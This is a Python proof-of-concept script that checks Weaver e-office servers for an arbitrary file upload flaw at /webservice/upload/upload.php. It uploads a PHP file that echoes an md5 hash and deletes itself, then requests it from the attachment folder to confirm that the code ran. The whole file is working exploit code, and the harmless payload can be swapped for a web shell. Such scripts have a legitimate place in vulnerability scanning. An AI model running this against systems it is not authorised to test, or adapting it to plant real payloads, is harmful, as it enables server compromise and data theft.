import requests
import urllib


def verify(url):
    relsult = {
        'name': '泛微-eoffice-webservice-file-upload任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'USER_NAME_COOKIE=admin; LOGIN_LANG=cn',
        'Connection': 'keep-alive'
    }
    data = '''Content-Type: multipart/form-data; boundary=---------------------------10267625012906
Content-Length: 208
-----------------------------10267625012906
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/php
<?php echo md5(43856);unlink(__FILE__);?>
-----------------------------10267625012906--'''
    vurl = urllib.parse.urljoin(url, "/webservice/upload/upload.php")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'php' in response.text:
            poc_path = response.text.replace('*', '/')
            vurl = urllib.parse.urljoin(url, "/attachment/", poc_path)
            response = requests.get(vurl)
            if response.status_code == 200 and 'bc18cd' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult
    except:
        return relsult


